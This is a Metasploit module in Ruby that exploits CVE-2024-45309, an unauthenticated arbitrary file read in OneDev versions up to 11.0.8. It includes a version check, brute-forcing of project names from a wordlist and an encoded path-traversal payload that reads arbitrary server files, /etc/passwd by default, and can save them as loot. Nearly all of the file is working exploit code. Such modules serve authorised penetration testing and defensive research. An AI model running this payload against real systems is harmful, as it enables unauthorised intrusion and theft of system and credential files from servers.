##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OneDev Unauthenticated Arbitrary File Read',
        'Description' => %q{
          This module exploits an unauthenticated arbitrary file read vulnerability (CVE-2024-45309), which affects OneDev versions <= 11.0.8.
          To exploit this vulnerability, a valid OneDev project name is required. If anonymous access is enabled on the OneDev server, any visitor
          can view existing projects without authentication.
          However, when anonymous access is disabled, an attacker who lacks prior knowledge of existing project names can use a brute-force approach.
          By providing a user-supplied wordlist, the module may be able to guess a valid project name and subsequently exploit the vulnerability.
        },
        'Author' => [
          'vultza', # metasploit module
          'Siebene' # vuln discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-45309'],
          ['URL', 'https://github.com/theonedev/onedev/security/advisories/GHSA-7wg5-6864-v489']
        ],
        'DisclosureDate' => '2024-10-19',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the OneDev instance', '/']),
        OptString.new('TARGETFILE', [true, 'The absolute file path to read', '/etc/passwd']),
        OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false]),
        OptString.new('PROJECT_NAME', [true, 'The target OneDev project name', '']),
        OptPath.new('PROJECT_NAMES_FILE', [
          false, 'File containing project names to try, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'namelist.txt')
        ])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })

    return CheckCode::Unknown('Request failed') unless res

    unless ['OneDev', "var redirect = '/~login';"].any? { |f| res.body.include? f }
      return CheckCode::Unknown("The target isn't a OneDev instance.")
    end

    version = res.body.scan(/OneDev ([\d.]+)/).first

    if version.nil?
      if datastore['PROJECT_NAME']
        res = read_file(datastore['PROJECT_NAME'], '/etc/passwd')

        if res.body.include? 'root:x:0:0:root:'
          return CheckCode::Vulnerable('OneDev instance is vulnerable.')
        else
          return CheckCode::Safe('OneDev instance is not vulnerable.')
        end
      end
      return CheckCode::Unknown('Unable to detect the OneDev version, as the instance does not have anonymous access enabled.')
    end

    version = Rex::Version.new(version[0])

    return CheckCode::Safe("OneDev #{version} is not vulnerable.") if version > Rex::Version.new('11.0.8')

    CheckCode::Appears("OneDev #{version} is vulnerable.")
  end

  def validate_project_exists(project)
    res = send_request_cgi({
      'method' => 'HEAD',
      'uri' => normalize_uri(target_uri.path, project, '~site')
    })

    return res&.code == 200
  end

  def find_project
    print_status 'Bruteforcing a valid project name…'

    File.open(datastore['PROJECT_NAMES_FILE'], 'rb').each do |project|
      project = project.strip
      next unless validate_project_exists(project)

      print_status("#{peer} - Found valid OneDev project name: #{project}")
      return project
    end
    nil
  end

  def read_file(project_name, target_file)
    path_traversal = '~site////////%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e'
    payload_path = normalize_uri(target_uri.path, project_name)
    payload_path = "#{payload_path}/#{path_traversal}#{target_file}"

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => payload_path
    })
    return res
  end

  def run
    project_name = datastore['PROJECT_NAME']

    if project_name.strip.empty?
      project_name = find_project
      fail_with(Failure::NoTarget, 'No valid OneDev project was found.') unless project_name
    else
      fail_with(Failure::NoTarget, 'Provided project name is invalid.') unless validate_project_exists(project_name)
    end

    res = read_file(project_name, datastore['TARGETFILE'])

    fail_with(Failure::Unreachable, 'Request timed out.') unless res

    fail_with(Failure::UnexpectedReply, "Target file #{datastore['TARGETFILE']} not found.") if res.body.include? 'Site file not found'

    file_name = datastore['TARGETFILE']
    if datastore['STORE_LOOT']
      store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], res.body, file_name, 'File retrieved from OneDev server')
      print_good("#{file_name} file stored in loot.")
    else
      print_good("#{file_name} file retrieved with success.\n#{res.body}")
    end
  end
end
